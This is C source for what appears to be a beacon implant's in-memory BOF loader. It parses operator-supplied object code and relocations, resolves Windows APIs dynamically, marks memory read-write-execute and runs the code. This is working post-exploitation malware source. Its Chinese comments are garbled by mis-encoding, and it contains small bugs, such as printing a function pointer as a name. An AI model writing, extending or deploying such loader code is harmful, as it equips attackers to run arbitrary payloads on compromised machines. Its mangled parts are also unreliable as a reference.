#include "Bof.h"
#include "Api.h"
#include "error.h"

PROC* FindOrAddDynamicFunction(Beacon_Internal_Api* api, PROC newFunction)
{
	PROC* potentialFuncLocation = NULL;

	// Iterate through the dynamic function array
	for (int index = 0; index < MAX_DYNAMIC_FUNCTIONS; ++index)
	{
		PROC* currentFunction = &api->dynamicFns[index];

		// Check if the current function matches the one we're looking for
		if (*currentFunction == newFunction)
		{
			// Function found, return its pointer
			return currentFunction;
		}

		// Check if we found an empty slot for a new function
		if (potentialFuncLocation == NULL && *currentFunction == NULL)
		{
			// Store the current slot as a potential location for the new function
			potentialFuncLocation = currentFunction;
		}
	}

	// If no empty slot was found, return NULL
	if (potentialFuncLocation == NULL)
	{
		return NULL;
	}

	// Add the new function to the found empty slot
	*potentialFuncLocation = newFunction;

	// Function added, return its pointer
	return potentialFuncLocation;
}

// ��֧�� x64 �����µ� coff ����
BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, char* lpCodeStart, char* lpCodeStartAddress, char* lpSection, unsigned long offsetInSection) {
	if (pImageRelocation->relocType < 10) {
		// ����������32���ƫ�ƣ����ж�ƫ���Ƿ���� 4GB
		const unsigned long long offset = *(unsigned long*)(lpCodeStart + pImageRelocation->rvaddre) + (unsigned long long)(lpSection + offsetInSection)
			- (unsigned long long)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
		if (offset + (UINT_MAX / 2 + 1) > UINT_MAX) {
			fprintf(stderr, "Relocation truncated to fit (distance between executable code and other data is >4GB)\n");
			BeaconErrorNA(ERROR_RELOCATION_TRUNCATED_TO_FIT);
			return FALSE;
		}
		*(long*)(lpCodeStart + pImageRelocation->rvaddre) = *(long*)(lpCodeStart + pImageRelocation->rvaddre) + (long)(lpSection + offsetInSection) - (long)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
	}
	else
	{
		fprintf(stderr, "Un-implemented relocation type %d", pImageRelocation->relocType);
		BeaconErrorD(ERROR_UNIMPLEMENTED_RELOCATION_TYPE, pImageRelocation->relocType);
		return FALSE;
	}

	return TRUE;
}

void CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
	Beacon_Internal_Api* api = malloc(sizeof(Beacon_Internal_Api));
	if (!api) {
		fprintf(stderr, "malloc memory failed\n");
		return;
	}
	BeaconInternalAPI(api);

	datap parse;
	BeaconDataParse(&parse, commandBuf, *commandBuflen);
	int entryPoint = BeaconDataInt(&parse);

	// �����
	sizedbuf codeBuf;
	char* code = BeaconDataLengthAndString(&parse, &codeBuf);
	int codeLength = codeBuf.size;

	// .rdata
	sizedbuf rdataBuf;
	char* rdata = BeaconDataLengthAndString(&parse, &rdataBuf);

	// .data
	sizedbuf dataBuf;
	char* data = BeaconDataLengthAndString(&parse, &dataBuf);

	// Beacon �Զ�����ض�λ�ṹ
	sizedbuf relocationsBuf;
	char* relocations = BeaconDataLengthAndString(&parse, &relocationsBuf);

	// ��ں�������
	sizedbuf bytesBuf;
	char* bytes = BeaconDataLengthAndString(&parse, &bytesBuf);

	char* lpCodeStartAddress = (char*)VirtualAlloc(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpCodeStartAddress)
	{
		fprintf(stderr, "VirtualAlloc failed with error:%lu\n", GetLastError());
		free(api);
		return;
	}
	PROC* dynamicFunctionPtr;
	datap relocationsParser;
	BeaconDataParse(&relocationsParser, relocations, relocationsBuf.size);

	for (BEACON_RELOCATION* reloc = (BEACON_RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(BEACON_RELOCATION));
		reloc->beaconRelocType.secType != END_RELOC_TYPE; reloc = (BEACON_RELOCATION*)BeaconDataPtr(&relocationsParser, sizeof(BEACON_RELOCATION))) {
		BOOL result;
		if (reloc->beaconRelocType.secType == RDATA_RELOC_TYPE) {
			result = processRelocation(reloc, code, lpCodeStartAddress, rdata, reloc->value);
		}
		else if (reloc->beaconRelocType.secType == DATA_RELOC_TYPE) {
			result = processRelocation(reloc, code, lpCodeStartAddress, data, reloc->value);
		}
		else if (reloc->beaconRelocType.secType == EXE_RELOC_TYPE) {
			result = processRelocation(reloc, code, lpCodeStartAddress, data, reloc->value);
		}
		else {
			// �ڲ�����
			if (reloc->beaconRelocType.funcType != DYNAMIC_FUNC_RELOC_TYPE) {
				dynamicFunctionPtr = (PROC*)api + reloc->beaconRelocType.funcType;
			}
			// �ⲿ������������ BEACON_RELOCATION �ṹ
			// ModuleLength(4 bytes) || ModuleString(ModuleLength bytes)
			// FunctionNameLength(4 bytes) || FunctionNameString(FunctionNameLength bytes)
			else {
				LPSTR lpModuleName = BeaconDataStringPointer(&relocationsParser);
				LPSTR lpFuncName = BeaconDataStringPointer(&relocationsParser);
				HMODULE hModule = GetModuleHandleA(lpModuleName);
				if (!hModule) {
					LoadLibraryA(lpModuleName);
				}
				hModule = GetModuleHandleA(lpModuleName);
				PROC lpFuncAddre = GetProcAddress(hModule, lpFuncName);
				if (!lpFuncAddre)
				{
					fprintf(stderr, "Could not resolve API %s!%s\n", lpModuleName, lpFuncAddre);
					goto cleanup;
				}
				dynamicFunctionPtr = FindOrAddDynamicFunction(api, lpFuncAddre);
			}
			result = processRelocation(reloc, code, lpCodeStartAddress, (char*)dynamicFunctionPtr, 0);
		}
		if (!result) goto cleanup;
	}
	memcpy(lpCodeStartAddress, code, codeLength);
	memset(code, 0, codeLength);

	DWORD oldProtect;
	// �޸��ڴ�Ȩ�� RWX
	if (!VirtualProtect(lpCodeStartAddress, codeLength, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		fprintf(stderr, "VirtualProtect failed with error:%lu", GetLastError());
	}
	// ִ����ں���
	((void(*)(char*, int))(lpCodeStartAddress + entryPoint))(bytes, bytesBuf.size);

cleanup:
	VirtualFree(lpCodeStartAddress, codeLength, 0);
	free(api);
}